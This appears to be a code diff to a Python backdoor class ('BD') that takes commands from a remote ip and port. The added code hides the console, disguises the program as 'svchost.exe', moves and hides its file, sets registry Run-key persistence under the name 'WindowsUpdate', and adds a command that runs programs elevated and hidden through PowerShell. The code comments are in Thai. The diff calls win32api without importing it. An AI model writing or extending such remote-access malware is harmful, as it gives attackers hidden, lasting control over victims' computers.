@@ -12,6 +12,10 @@ import base64
 import pkg_resources
 import ctypes
 import psutil
+import winreg
+import win32gui
+import win32con
+import win32process
 
 
 class BD:
@@ -21,9 +25,8 @@ class BD:
         self.install_dependencies()
         self.ip = ip 
         self.port = port
-        self.upgrade_pip()
-        self.install_dependencies()
         self.reconnect()
+        self.hide_self()
         # self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # self.connection.connect((ip, port))
 
@@ -260,7 +263,50 @@ class BD:
             return f"[-] System info error: {str(e)}"
 
 
-        
+
+
+    def hide_self(self):
+            """ซ่อนตัวเองในระบบ"""
+            try:
+                
+                # ทำการซ่อน console
+                hwnd = win32gui.GetForegroundWindow()
+                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+                
+                # เปลี่ยนชื่อ process ให้เหมือน system process
+                current_pid = os.getpid()
+                process_name = "svchost.exe"  # หรือชื่ออื่นๆ ที่ดูเป็น system process
+                
+                # ปรับ priority และ affinity
+                handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, True, current_pid)
+                win32process.SetPriorityClass(handle, win32process.IDLE_PRIORITY_CLASS)
+                
+                # ย้ายไฟล์ไปที่ system directory
+                if not self.is_in_system_dir():
+                    self.move_to_system_dir()
+                
+                # ซ่อนไฟล์
+                try:
+                    win32api.SetFileAttributes(sys.executable, win32con.FILE_ATTRIBUTE_HIDDEN)
+                except:
+                    pass
+                    
+                # เพิ่มการซ่อนใน Registry
+                reg_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+                reg_name = "WindowsUpdate"
+                
+                try:
+                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, 
+                                    winreg.KEY_WRITE)
+                    winreg.SetValueEx(key, reg_name, 0, winreg.REG_SZ, sys.executable)
+                    winreg.CloseKey(key)
+                except:
+                    pass
+
+                return True
+            except Exception:
+                return False
+
         
     def system_shutdown(self):
         try:
@@ -310,6 +356,30 @@ class BD:
             return "[+] Reboot command executed"
         except Exception as e:
             return f"[-] Reboot error: {str(e)}"
+        
+    
+    def run_as_admin(self, program_path, args=None):
+        try:
+            if not os.path.exists(program_path):
+                return "[-] Program not found"
+
+            if args is None:
+                args = ""
+
+            # cmd = f'powershell.exe Start-Process "{program_path}" -ArgumentList "{args}" -Verb RunAs -WindowStyle Hidden'
+            cmd = (
+            f'powershell.exe Start-Process "{program_path}" '
+            f'-ArgumentList "{args}" -Verb RunAs -WindowStyle Hidden'
+            )
+
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            
+            if result.returncode == 0:
+                return "[+] Program executed with admin."
+            else:
+                return f"[-] Execution error: {result.stderr}"
+        except Exception as e:
+            return f"[-] Admin execution error: {str(e)}"
 
     def run_cmd(self):
         while True:
@@ -323,6 +393,10 @@ class BD:
 
                 elif cmd[0] == "cd" and len(cmd) > 1:
                     cmd_result = self.change_directory_to(cmd[1])
+
+                elif cmd[0] == "runadmin" and len(cmd) > 1:
+                    args = cmd[2] if len(cmd) > 2 else None
+                    cmd_result = self.run_as_admin(cmd[1], args)
 
                 elif cmd[0] == "upload" and len(cmd) > 2:
                     cmd_result = self.up_file(cmd[1], cmd[2])
